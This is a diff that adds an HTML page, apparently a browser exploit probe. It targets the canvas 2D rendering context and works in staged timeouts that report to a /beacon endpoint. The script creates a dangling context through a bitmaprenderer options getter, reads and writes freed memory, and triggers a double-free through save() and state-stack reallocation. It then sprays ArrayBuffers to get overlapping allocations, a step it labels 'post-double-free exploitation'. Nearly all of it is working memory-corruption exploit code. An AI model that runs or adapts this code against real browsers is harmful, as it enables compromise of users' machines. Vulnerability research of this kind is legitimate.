@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V539</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V539 — Write-to-freed + double-free probe
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V539-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+var dangling, official, officialCanvas;
+var PHASE = 0;
+
+// P1: Create aliased pair
+setTimeout(function(){
+  try {
+    B('P1-START','aliased pair');
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var inner = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() { inner = c.getContext('2d'); return true; }
+    });
+    c.getContext('bitmaprenderer', s);
+    if (!inner) { B('P1-FAIL','no inner'); return; }
+
+    var ctxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 200 + i;
+      ctxs.push({canvas: nc, ctx: nctx});
+    }
+
+    var dlw = inner.lineWidth;
+    if (dlw >= 200 && dlw < 400) {
+      var idx = dlw - 200;
+      dangling = inner;
+      official = ctxs[idx].ctx;
+      officialCanvas = ctxs[idx].canvas;
+      window._ctxs = ctxs;
+      B('P1-OK','aliased at #'+idx);
+      PHASE = 1;
+    } else { B('P1-MISS','lw='+dlw); }
+  } catch(e) { B('P1-ERR',''+e); }
+}, 200);
+
+// P2: Grow stateStack, set markers, free
+setTimeout(function(){
+  if (PHASE < 1) return;
+  try {
+    B('P2-START','setup + free');
+    official.lineWidth = 555.5;
+    official.globalAlpha = 0.123456;
+    official.miterLimit = 888.8;
+    official.lineDashOffset = 777.7;
+    official.setTransform(11.11, 22.22, 33.33, 44.44, 55.55, 66.66);
+
+    official.save();
+    var rlw = official.lineWidth; // realize
+    B('P2-REALIZED','lw='+rlw);
+
+    // Set entry[1] to different values
+    official.lineWidth = 444.4;
+    official.globalAlpha = 0.987;
+
+    // Free context
+    var s2 = {};
+    Object.defineProperty(s2, 'alpha', { get: function() { return true; } });
+    officialCanvas.getContext('bitmaprenderer', s2);
+    B('P2-FREED','done');
+    PHASE = 2;
+  } catch(e) { B('P2-ERR',''+e); }
+}, 1500);
+
+// P3: Confirm read from freed memory
+setTimeout(function(){
+  if (PHASE < 2) return;
+  try {
+    B('P3-START','read freed');
+    var lw = dangling.lineWidth;
+    var ga = dangling.globalAlpha;
+    var ml = dangling.miterLimit;
+    var ldo = dangling.lineDashOffset;
+    B('P3-READ','lw='+lw+' ga='+ga+' ml='+ml+' ldo='+ldo);
+    PHASE = 3;
+  } catch(e) { B('P3-ERR',''+e+' — read crashed'); PHASE = -1; }
+}, 3000);
+
+// P4: WRITE to freed memory, then read back
+setTimeout(function(){
+  if (PHASE < 3) return;
+  try {
+    B('P4-START','write-to-freed');
+
+    // Write distinctive values through dangling wrapper
+    dangling.lineWidth = 12345.6789;
+    var lw1 = dangling.lineWidth;
+    B('P4-LW','wrote 12345.6789, read back: '+lw1);
+
+    dangling.globalAlpha = 0.999;
+    var ga1 = dangling.globalAlpha;
+    B('P4-GA','wrote 0.999, read back: '+ga1);
+
+    dangling.miterLimit = 54321.0;
+    var ml1 = dangling.miterLimit;
+    B('P4-ML','wrote 54321, read back: '+ml1);
+
+    dangling.lineDashOffset = 98765.0;
+    var ldo1 = dangling.lineDashOffset;
+    B('P4-LDO','wrote 98765, read back: '+ldo1);
+
+    // Write 6 doubles via setTransform
+    dangling.setTransform(1.111, 2.222, 3.333, 4.444, 5.555, 6.666);
+    try {
+      var t = dangling.getTransform();
+      B('P4-TX','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+    } catch(e) { B('P4-TX-ERR','getTransform: '+e); }
+
+    PHASE = 4;
+  } catch(e) { B('P4-ERR',''+e); }
+}, 4500);
+
+// P5: save() on freed context → triggers Vector realloc → double-free
+setTimeout(function(){
+  if (PHASE < 4) return;
+  try {
+    B('P5-START','save on freed → double-free attempt');
+
+    // save() is non-virtual: just increments m_unrealizedSaveCount in freed 768B
+    dangling.save();
+    B('P5-SAVED','save() succeeded on freed context');
+
+    // Now read lineWidth → triggers realizeSaves() which:
+    // 1. Reads m_unrealizedSaveCount from freed 768B (now = 1)
+    // 2. Calls m_stateStack.append(state()) on the freed Vector
+    // 3. Vector::append on full capacity → expandCapacity → allocate NEW buffer
+    // 4. Copy from OLD buffer (freed stateStack) to NEW buffer
+    // 5. FREE OLD buffer → DOUBLE FREE (it was already freed!)
+    // 6. Update m_buffer/m_size/m_capacity in freed 768B
+    var lw = dangling.lineWidth;
+    B('P5-POST-SAVE','lineWidth after save+realize: '+lw);
+
+    // If we survived, the double-free happened!
+    // Check state consistency
+    var ga = dangling.globalAlpha;
+    var ml = dangling.miterLimit;
+    B('P5-STATE','ga='+ga+' ml='+ml);
+
+    PHASE = 5;
+  } catch(e) { B('P5-ERR',''+e+' — double-free crashed'); PHASE = -2; }
+}, 6000);
+
+// P6: After double-free, try to exploit overlapping allocations
+setTimeout(function(){
+  if (PHASE === 5) {
+    try {
+      B('P6-START','post-double-free exploitation');
+
+      // The old stateStack buffer (2*sizeof(State)) is on free list TWICE
+      // Also a new buffer (3*sizeof(State)) was allocated
+      // Try save() again to trigger ANOTHER realloc (more double-frees)
+      dangling.save();
+      var lw2 = dangling.lineWidth; // realize
+      B('P6-SAVE2','second save+realize: lw='+lw2);
+
+      // Now try restore to go back in stateStack
+      dangling.restore();
+      var lw3 = dangling.lineWidth;
+      B('P6-RESTORE','after restore: lw='+lw3);
+
+      // Read all interesting state from deeper entries
+      dangling.restore();
+      var lw4 = dangling.lineWidth;
+      B('P6-RESTORE2','after 2nd restore: lw='+lw4);
+
+      PHASE = 6;
+    } catch(e) { B('P6-ERR',''+e); }
+  } else if (PHASE === -2) {
+    B('P6-SKIP','double-free crashed, trying different approach');
+  } else {
+    B('P6-SKIP','phase='+PHASE);
+  }
+}, 7500);
+
+// P7: Alternative — if double-free works, spray ABs to get overlapping memory
+setTimeout(function(){
+  if (PHASE < 5) { B('P7-SKIP','phase='+PHASE); return; }
+  try {
+    B('P7-START','AB spray after double-free');
+
+    // Spray ABs at various sizes to try to get one that overlaps with
+    // an active stateStack buffer (the new 3*sizeof(State) buffer)
+    // Since save() allocated a new buffer, the old (double-freed) buffer
+    // might be served to one of our ABs
+
+    // Try sizes from 640 to 2048 in steps of 64
+    for (var sz = 640; sz <= 2048; sz += 64) {
+      var spray = [];
+      for (var j = 0; j < 100; j++) {
+        var ab = new ArrayBuffer(sz);
+        var dv = new DataView(ab);
+        for (var k = 0; k < sz; k += 8) {
+          dv.setFloat64(k, sz + (k/8) * 0.001, true);
+        }
+        spray.push(ab);
+      }
+
+      // Check if lineWidth changed (reading from potentially AB-overlapped memory)
+      var lw = dangling.lineWidth;
+      if (Math.floor(lw) >= 640 && Math.floor(lw) <= 2048) {
+        var hitSize = Math.floor(lw);
+        var hitPos = Math.round((lw - hitSize) * 1000);
+        B('P7-HIT','SIZE='+sz+' lw='+lw+' bufSize='+hitSize+' pos='+hitPos+' byteOff='+(hitPos*8));
+        // Read more fields
+        try {
+          var ga = dangling.globalAlpha;
+          var ml = dangling.miterLimit;
+          B('P7-HIT-STATE','ga='+ga+' ml='+ml);
+        } catch(e2) {}
+        break;
+      }
+      if (sz % 256 === 0) B('P7-SWEEP','through '+sz+' lw='+lw);
+    }
+  } catch(e) { B('P7-ERR',''+e); }
+}, 9000);
+
+// P8: WRITE through dangling, check if any AB contains our value
+setTimeout(function(){
+  if (PHASE < 5) { B('P8-SKIP','phase='+PHASE); return; }
+  try {
+    B('P8-START','write probe');
+
+    // Write a unique double through dangling
+    dangling.lineWidth = 31337.42;
+    B('P8-WROTE','lineWidth=31337.42');
+
+    // Read back
+    var lw = dangling.lineWidth;
+    B('P8-READBACK','lineWidth='+lw);
+
+    // Write 6 doubles via setTransform
+    dangling.setTransform(
+      1.7976931348623157e+308, // MAX_VALUE — distinctive
+      5e-324,                   // MIN_VALUE
+      -0,
+      Infinity,
+      -Infinity,
+      NaN
+    );
+    // getTransform might normalize these
+    try {
+      var t = dangling.getTransform();
+      B('P8-TX','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+    } catch(e) { B('P8-TX-ERR',''+e); }
+  } catch(e) { B('P8-ERR',''+e); }
+}, 10500);
+
+setTimeout(function(){B('COMPLETE','all done')},14000);
+</script></body></html>
